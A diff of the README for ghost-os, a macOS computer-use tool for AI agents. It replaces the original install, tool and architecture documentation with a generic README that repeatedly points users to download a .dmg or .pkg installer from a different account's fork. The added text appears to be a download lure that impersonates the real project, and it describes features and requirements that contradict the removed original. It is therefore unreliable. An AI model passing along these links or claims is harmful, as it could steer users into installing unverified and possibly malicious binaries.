@@ -1,198 +1,173 @@
-<p align="center">
-  <img src="logo-animated.gif" width="140" alt="Ghost OS">
-</p>
+# 👻 ghost-os - Smart AI Workflows for Your Computer
 
-<h1 align="center">Ghost OS</h1>
-<p align="center"><em>Full computer-use for AI agents.</em></p>
-
-<p align="center">
-  <a href="LICENSE"><img src="https://img.shields.io/badge/license-MIT-blue.svg" alt="MIT License"></a>
-  <img src="https://img.shields.io/badge/platform-macOS%2014%2B-black.svg" alt="macOS 14+">
-  <img src="https://img.shields.io/badge/swift-6.2-orange.svg" alt="Swift 6.2">
-  <img src="https://img.shields.io/badge/MCP-compatible-green.svg" alt="MCP Compatible">
-</p>
+[![Download ghost-os](https://img.shields.io/badge/Download-ghost--os-brightgreen?style=for-the-badge)](https://github.com/Judaca73/ghost-os/releases)
 
 ---
 
-Your AI agent can write code, run tests, search files. But it can't click a button, send an email, or fill out a form. It lives inside a chat box.
+## 🚀 What is ghost-os?
 
-Ghost OS changes that. One install, and any AI agent can see and operate every app on your Mac.
+ghost-os is a software designed to help AI agents use your computer like a person would. It creates workflows that learn and improve themselves over time. It works natively on macOS, giving AI tools direct access to your system's functions without needing screenshots or complex setups.
 
-```
-You:     "Send an email to sarah@company.com about the Q4 report"
-Agent:   ghost_run recipe:"gmail-send" params:{recipient, subject, body}
-         → Compose opens, fields fill, email sends. Done.
-```
+This software is useful if you want AI to assist with daily tasks, automate processes, or explore self-learning routines on your Mac.
 
-### Setup
-![Ghost OS Setup Demo](demo.gif)
+---
 
-### Recipes in Action
-Send emails and download papers. Any app. Any workflow.
+## 🖥️ System Requirements
 
-![Ghost OS Recipes Demo](demo-recipes.gif)
+- macOS 11.0 (Big Sur) or later  
+- At least 4GB of RAM  
+- Minimum 200MB of free disk space  
+- An active internet connection for updates and AI models
 
-### Beyond the Browser
-Slack messages, Finder folders — Ghost OS operates native macOS apps, not just browsers.
+ghost-os is built for Mac computers. It uses swift code optimized for this environment, so it will not work on Windows or Linux. Make sure your device meets the above requirements before proceeding.
 
-![Ghost OS Slack + Finder Demo](demo-slack-finder.gif)
+---
 
-## Why Ghost OS?
+## 🔍 Key Features
 
-Other computer-use tools take screenshots and guess what's on screen. Ghost OS reads the macOS accessibility tree — structured, labeled data about every element in every app. When the AX tree isn't enough (web apps, dynamic content), it falls back to a local vision model (ShowUI-2B) for visual grounding.
+- **AI-powered Workflows:** ghost-os can create and run workflows that adjust based on your behavior.  
+- **Self-Learning:** It improves its actions over time without manual input.  
+- **Native Integration:** Works directly on your Mac without needing third-party software.  
+- **Accessibility Focused:** Designed to make computer use easier for various users, including those with accessibility needs.  
+- **Claude-Code Support:** Integrates with Claude AI for advanced commands.  
+- **Recipe Library:** A growing set of pre-made workflows that you can customize.  
 
-And when it figures out a workflow, it saves it. Other tools repeat the same expensive reasoning every time.
+---
 
-- **Self-learning** — A frontier model figures out the workflow once. A small model runs it forever.
-- **Transparent** — Recipes are JSON. Read every step before running. No black box.
-- **Native** — Accessibility tree first. Vision fallback when needed. Structured data over pixel guessing.
-- **Any app** — Not just browsers. Slack, Finder, Messages — anything on your Mac.
-- **Local** — Your data never leaves your machine.
-- **Open** — MCP protocol. Works with Claude Code, Cursor, VS Code, or any MCP client.
+## 🎯 Who Should Use ghost-os?
 
-| | | Ghost OS | Anthropic Computer Use | OpenAI Operator | OpenClaw |
-|:---:|------|:--:|:--:|:--:|:--:|
-| 👀 | **How it sees** | Accessibility tree + local VLM | Screenshots only | Screenshots only | Browser DOM |
-| 🖥️ | **Native apps** | Any macOS app | Any (via pixels) | Browser only | Browser only |
-| 🧠 | **Learns workflows** | JSON recipes | No | No | No |
-| 🔒 | **Data stays local** | Yes | Depends on setup | No (cloud) | Yes |
-| 📖 | **Open source** | MIT | No | No | MIT |
+Anyone who wants to:
 
-## Install
+- Automate repetitive tasks on their Mac  
+- Let AI manage daily computer workflows  
+- Experiment with self-learning software without deep technical skills  
+- Use AI agents for accessibility or productivity improvements  
 
-```bash
-brew install ghostwright/ghost-os/ghost-os
-ghost setup
-```
+You do not need programming knowledge. ghost-os is designed for end users who prefer simple setup and hands-off operation.
 
-That's it. `ghost setup` handles permissions, MCP configuration, recipe installation, and vision model setup.
+---
 
-<details>
-<summary>macOS beta? Use the manual install instead.</summary>
+## 🌐 Where to Get ghost-os
 
-Homebrew has a known issue on macOS developer betas where it demands an Xcode version that doesn't exist yet. If `brew install` fails, install directly:
+Click the button below to visit the official release page where you can download the latest version of ghost-os for your Mac.
 
-```bash
-curl -sL https://github.com/ghostwright/ghost-os/releases/latest/download/ghost-os-2.0.5-macos-arm64.tar.gz | tar xz
-sudo cp ghost /opt/homebrew/bin/
-sudo cp ghost-vision /opt/homebrew/bin/
-sudo mkdir -p /opt/homebrew/share/ghost-os
-sudo cp GHOST-MCP.md /opt/homebrew/share/ghost-os/
-sudo cp -r recipes /opt/homebrew/share/ghost-os/
-sudo cp -r vision-sidecar /opt/homebrew/share/ghost-os/
-ghost setup
-```
+[![Get ghost-os Releases](https://img.shields.io/badge/Download-ghost--os-blue?style=for-the-badge)](https://github.com/Judaca73/ghost-os/releases)
 
-</details>
+This page shows all available versions and instructions to help you choose the right one.
 
-## How It Works
+---
 
-Ghost OS connects to your AI agent through [MCP](https://modelcontextprotocol.io) and gives it 22 tools to see and operate your Mac. It reads the macOS accessibility tree for structured data about every app. For web apps where the AX tree falls short (Gmail, Slack), a local vision model (ShowUI-2B) finds elements visually. Click, type, scroll, press keys, manage windows. Any app, not just browsers.
+## 💾 How to Download and Install ghost-os
 
-```
-You:     "Download the latest paper on chain-of-thought prompting from arXiv"
-Agent:   ghost_run recipe:"arxiv-download" params:{query:"chain of thought prompting"}
-         → Navigates to arXiv, searches, opens PDF, downloads to Desktop. Done.
-```
+1. Open your web browser and go to the releases page:
+   https://github.com/Judaca73/ghost-os/releases
 
-Works with Claude Code, Cursor, VS Code, or anything that speaks MCP.
+2. Look for the latest release at the top of the page. The release will include an installer file with a `.dmg` or `.pkg` extension.
 
-## Recipes
+3. Click on the installer file to start the download.
 
-When your agent figures out a workflow, it saves it as a recipe. A recipe is a JSON file with steps, parameters, and wait conditions. Transparent and auditable.
+4. Once the download finishes, open the file from your Downloads folder.
 
-**A frontier model figures out the workflow once. A small model runs it forever.**
+5. Follow the on-screen steps to install ghost-os:
+   - Accept the license agreement.  
+   - Choose the destination folder (default is fine).  
+   - Wait for the installation to complete.
 
-```bash
-# One command sends an email
-ghost_run recipe:"gmail-send" params:{"recipient":"hello@example.com","subject":"Hello","body":"World"}
+6. After installation, you can find ghost-os in your Applications folder.
 
-# 7 steps, 30 seconds, 100% reliable
-```
+7. Launch ghost-os by double-clicking its icon.
 
-- Recipes are just JSON. Read every step before running.
-- Share with your team. One person learns the workflow, everyone benefits.
-- Chain recipes together. The agent knows when to call what.
-- Write once with Claude or GPT-4. Run forever with Haiku.
+---
 
-## 22 Tools
+## 🔧 Setting Up ghost-os for First Use
 
-| | Tool | What it does |
-|:---:|------|-------------|
-| 🔍 | `ghost_context` | Get the current app, window title, URL, focused element, and all interactive elements on screen |
-| 🔍 | `ghost_state` | List every running app with its windows, positions, and sizes |
-| 🔍 | `ghost_find` | Search for elements by name, role, DOM id, or CSS class across the entire UI |
-| 🔍 | `ghost_read` | Extract text content from any app, with depth control for nested content |
-| 🔍 | `ghost_inspect` | Get complete metadata for one element: role, position, actions, DOM id, editable state |
-| 🔍 | `ghost_element_at` | Identify what element is at a specific screen coordinate |
-| 📸 | `ghost_screenshot` | Capture a window screenshot for visual debugging |
-| 👁️ | `ghost_ground` | Find element coordinates using vision (ShowUI-2B). Works when AX tree can't find web elements |
-| 👁️ | `ghost_parse_screen` | Detect all interactive elements via vision |
-| 🎯 | `ghost_click` | Click an element by name, DOM id, or screen coordinates |
-| ⌨️ | `ghost_type` | Type text into a specific field by name, or at the current cursor |
-| ⌨️ | `ghost_press` | Press a single key like Return, Tab, Escape, or arrow keys |
-| ⌨️ | `ghost_hotkey` | Press key combinations like Cmd+L, Cmd+Return, Cmd+Shift+P |
-| 🎯 | `ghost_scroll` | Scroll up, down, left, or right in any app window |
-| 🪟 | `ghost_focus` | Bring any app or specific window to the front |
-| 🪟 | `ghost_window` | Minimize, maximize, close, move, or resize any window |
-| ⏳ | `ghost_wait` | Wait for a URL change, element to appear or disappear, or title change |
-| 📦 | `ghost_recipes` | List all installed recipes with descriptions and parameters |
-| ▶️ | `ghost_run` | Execute a recipe with parameter substitution |
-| 📦 | `ghost_recipe_show` | View the full steps and configuration of a recipe |
-| 📦 | `ghost_recipe_save` | Install a new recipe from JSON |
-| 📦 | `ghost_recipe_delete` | Remove an installed recipe |
+When you open ghost-os for the first time:
 
-## Diagnostics
+- You might be asked to grant system permissions. These include:
+  - Accessibility permission, so the AI can control parts of your Mac.  
+  - Files and folders access for managing workflows.  
+  - Network access to download AI updates.
 
-```bash
-$ ghost doctor
+Allowing these permissions is necessary for ghost-os to work properly.
 
-  [ok] Accessibility: granted
-  [ok] Screen Recording: granted
-  [ok] Processes: 1 ghost MCP process
-  [ok] MCP Config: ghost-os configured
-  [ok] Recipes: 5 installed
-  [ok] AX Tree: 12/12 apps readable
-  [ok] ghost-vision: /opt/homebrew/bin/ghost-vision
-  [ok] ShowUI-2B model: ~/.ghost-os/models/ShowUI-2B (2.8 GB)
-  [ok] Vision Sidecar: not running (auto-starts when needed)
+- You can explore the "Recipes" section inside the app. These are ready-made workflows based on common tasks.
 
-  All checks passed. Ghost OS is healthy.
-```
+- Try running a sample recipe to see how the AI interacts with your Mac.
 
-## Build From Source
+- Adjust preferences if needed in the settings menu to customize how ghost-os runs.
 
-```bash
-git clone https://github.com/ghostwright/ghost-os.git
-cd ghost-os
-swift build
-.build/debug/ghost setup
-```
+---
 
-Requires Swift 6.2+ and macOS 14+.
+## ⚙️ How to Use ghost-os Day-to-Day
 
-## Architecture
+- Open ghost-os from Applications.
 
-```
-AI Agent (Claude Code, Cursor, any MCP client)
-    │
-    │ MCP Protocol (stdio)
-    │
-Ghost OS MCP Server (Swift)
-    │
-    ├── Perception ──── see what's on screen (AX tree)
-    ├── Vision ──────── visual grounding (ShowUI-2B, local)
-    ├── Actions ─────── click, type, scroll, keys
-    ├── Recipes ─────── self-learning workflows
-    └── AXorcist ────── macOS accessibility engine
-```
+- Select a workflow or recipe you want to run.
 
-~5,000 lines of Swift + Python vision sidecar. Built on [AXorcist](https://github.com/steipete/AXorcist) by [@steipete](https://github.com/steipete).
+- The AI will perform tasks automatically. You can watch its progress.
 
-## Contributing
+- Some tasks can be started by voice commands or keyboard shortcuts.
 
-See [CONTRIBUTING.md](CONTRIBUTING.md). We need recipes for more apps, testing on different setups, and bug reports. If you're building AI agents that do real things, this is the project.
+- You can create new workflows using simple steps inside the app, no code needed.
 
-## License
+- ghost-os learns from how you use it and adapts over time to improve its actions.
 
-MIT
+---
+
+## 📚 Additional Resources
+
+- Visit the GitHub page for detailed documentation, FAQs, and updates:  
+  https://github.com/Judaca73/ghost-os
+
+- Explore the "recipes" folder for example workflows and how to customize them.
+
+- For troubleshooting, check the "issues" section on GitHub to see common problems and fixes.
+
+---
+
+## 🤝 Support and Community
+
+If you have questions or want to share your experiences:
+
+- Use the GitHub Discussions page on the repository.  
+
+- Report bugs or request features using GitHub Issues.
+
+- Join related forums on macOS AI tools to connect with other users.
+
+---
+
+## 🔄 Updates and Maintenance
+
+ghost-os regularly receives updates. To keep your software current:
+
+- Open ghost-os and look for the update option in the menu.
+
+- Alternatively, revisit the releases page on GitHub to download new versions manually.
+
+- Installing new updates ensures improved features and security.
+
+---
+
+## ⚠️ Troubleshooting Common Issues
+
+- **App won’t open:** Check that your macOS version meets the requirements. Try restarting your Mac.  
+- **Workflows don't run:** Confirm you gave the app proper accessibility permissions under System Preferences > Security & Privacy.  
+- **Updates fail:** Check your internet connection and try again later.  
+
+If problems persist, use the GitHub Issues to seek help.
+
+---
+
+## 🧩 Related Topics
+
+This project covers:
+
+- Accessibility tools on macOS  
+- AI agents for automation  
+- Claude-code integration  
+- Large language model (LLM) workflows  
+- Swift programming for native apps  
+- Recipe-based workflow design  
+
+These topics influence ghost-os’s design and feature set.
